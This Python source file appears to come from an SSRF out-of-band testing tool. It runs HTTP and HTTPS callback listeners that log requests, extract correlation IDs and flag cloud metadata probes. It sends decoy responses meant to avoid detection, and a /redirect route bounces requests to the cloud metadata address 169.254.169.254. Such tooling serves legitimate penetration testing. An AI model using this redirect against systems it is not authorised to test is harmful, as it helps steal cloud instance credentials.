"""
HTTP / HTTPS Listener
----------------------
Captures all incoming HTTP requests with full headers, body, and metadata.
Extracts correlation ID from subdomain, path, or query params.
Supports HTTPS with auto-generated self-signed cert.
"""

import threading
import socket
import ssl
import time
import re
import json
import os
import tempfile
from http.server import HTTPServer, BaseHTTPRequestHandler
from ..store import STORE, generate_correlation_id

# Colors
R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
C = "\033[96m"; DIM = "\033[90m"; BOLD = "\033[1m"; RST = "\033[0m"


def _extract_corr_from_host(host: str, base_domain: str) -> str:
    """Extract correlation ID from subdomain: abc123.callback.domain → abc123"""
    if not host or not base_domain:
        return None
    host_clean = host.split(":")[0].lower()
    base_clean = base_domain.lower()
    if host_clean.endswith(f".{base_clean}"):
        subdomain = host_clean[: -(len(base_clean) + 1)]
        parts = subdomain.split(".")
        return parts[0] if parts else None
    return None


def _extract_corr_from_path(path: str) -> str:
    """Extract correlation from path like /abc123def456/anything"""
    m = re.match(r"/([a-f0-9]{8,16})", path)
    return m.group(1) if m else None


def _extract_corr_from_query(query: str) -> str:
    """Extract corr= or id= from query string."""
    m = re.search(r"(?:corr|id|token|key)=([a-zA-Z0-9_-]{6,32})", query)
    return m.group(1) if m else None


class SSRFRequestHandler(BaseHTTPRequestHandler):

    base_domain = ""
    verbose = True

    def _log_interaction(self):
        client_ip = self.client_address[0]
        raw_path  = self.path
        path_part = raw_path.split("?")[0]
        query     = raw_path.split("?")[1] if "?" in raw_path else ""
        host      = self.headers.get("Host", "")

        # Extract correlation ID
        corr = (
            _extract_corr_from_host(host, self.base_domain) or
            _extract_corr_from_path(path_part) or
            _extract_corr_from_query(query)
        )

        # Read body
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="replace") if content_length else ""

        # Detect cloud metadata probe
        metadata_hit = None
        metadata_paths = {
            "/latest/meta-data": "AWS IMDSv1",
            "/computeMetadata":  "GCP Metadata",
            "/metadata/instance":"Azure IMDS",
            "/metadata/v1":      "DigitalOcean Metadata",
        }
        for mpath, mname in metadata_paths.items():
            if mpath in path_part:
                metadata_hit = mname

        raw_data = {
            "method":       self.command,
            "path":         raw_path,
            "host":         host,
            "headers":      dict(self.headers),
            "body":         body[:4096],
            "user_agent":   self.headers.get("User-Agent", ""),
            "referer":      self.headers.get("Referer", ""),
            "content_type": self.headers.get("Content-Type", ""),
            "correlation":  corr,
            "metadata_hit": metadata_hit,
            "protocol":     "https" if getattr(self.server, "is_https", False) else "http",
        }

        proto = raw_data["protocol"]
        interaction = STORE.add(proto, client_ip, raw_data)

        if self.verbose:
            meta_tag = f" {R}[{metadata_hit}]{RST}" if metadata_hit else ""
            corr_tag = f" {Y}corr={corr}{RST}" if corr else ""
            print(f"\n  {R}{BOLD}[{proto.upper()} HIT]{RST}{meta_tag}{corr_tag}")
            print(f"    From     : {client_ip}")
            print(f"    Method   : {self.command}")
            print(f"    Host     : {host}")
            print(f"    Path     : {raw_path[:80]}")
            if self.headers.get("User-Agent"):
                print(f"    UA       : {self.headers.get('User-Agent')[:60]}")
            if body:
                print(f"    Body     : {body[:100]}")
            print()

        return interaction

    def do_GET(self):
        self._log_interaction()
        self._send_response()

    def do_POST(self):
        self._log_interaction()
        self._send_response()

    def do_PUT(self):
        self._log_interaction()
        self._send_response()

    def do_HEAD(self):
        self._log_interaction()
        self._send_response()

    def do_OPTIONS(self):
        self._log_interaction()
        self._send_response()

    def do_DELETE(self):
        self._log_interaction()
        self._send_response()

    def _send_response(self):
        """Send a realistic-looking response to avoid detection."""
        path = self.path.lower()

        # Serve different responses based on path to look legitimate
        if "/api" in path or path.endswith(".json"):
            body = b'{"status": "ok"}'
            ctype = "application/json"
        elif path.endswith(".xml"):
            body = b"<?xml version='1.0'?><root><status>ok</status></root>"
            ctype = "text/xml"
        elif "/redirect" in path:
            self.send_response(302)
            self.send_header("Location", "http://169.254.169.254/latest/meta-data/")
            self.end_headers()
            return
        else:
            body = b"<html><body>OK</body></html>"
            ctype = "text/html"

        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Server", "nginx/1.24.0")
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, format, *args):
        pass  # suppress default logging — we handle our own


def _generate_self_signed_cert() -> tuple:
    """Generate a self-signed cert for HTTPS listener."""
    try:
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.backends import default_backend
        import datetime

        key = rsa.generate_private_key(65537, 2048, default_backend())
        name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, u"callback.local")])
        cert = (
            x509.CertificateBuilder()
            .subject_name(name).issuer_name(name)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.datetime.utcnow())
            .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
            .sign(key, hashes.SHA256())
        )

        tmp_dir = tempfile.mkdtemp()
        cert_path = os.path.join(tmp_dir, "cert.pem")
        key_path  = os.path.join(tmp_dir, "key.pem")

        with open(cert_path, "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        with open(key_path, "wb") as f:
            f.write(key.private_bytes(
                serialization.Encoding.PEM,
                serialization.PrivateFormat.TraditionalOpenSSL,
                serialization.NoEncryption()
            ))

        return cert_path, key_path
    except ImportError:
        return None, None


def start_http_listener(port: int = 80, base_domain: str = "",
                          verbose: bool = True) -> threading.Thread:
    """Start HTTP listener in background thread."""
    SSRFRequestHandler.base_domain = base_domain
    SSRFRequestHandler.verbose     = verbose

    class QuietHTTPServer(HTTPServer):
        def handle_error(self, request, client_address):
            pass  # suppress connection errors

    server = QuietHTTPServer(("0.0.0.0", port), SSRFRequestHandler)

    def serve():
        if verbose:
            print(f"  {G}[HTTP]{RST}  Listening on port {port}")
        server.serve_forever()

    t = threading.Thread(target=serve, daemon=True)
    t.start()
    return t


def start_https_listener(port: int = 443, base_domain: str = "",
                           verbose: bool = True) -> threading.Thread:
    """Start HTTPS listener with self-signed cert."""
    cert_path, key_path = _generate_self_signed_cert()

    SSRFRequestHandler.base_domain = base_domain
    SSRFRequestHandler.verbose     = verbose

    class QuietHTTPSServer(HTTPServer):
        is_https = True
        def handle_error(self, request, client_address):
            pass

    server = QuietHTTPSServer(("0.0.0.0", port), SSRFRequestHandler)

    if cert_path and key_path:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(cert_path, key_path)
        server.socket = ctx.wrap_socket(server.socket, server_side=True)

    def serve():
        if verbose:
            print(f"  {G}[HTTPS]{RST} Listening on port {port}")
        server.serve_forever()

    t = threading.Thread(target=serve, daemon=True)
    t.start()
    return t
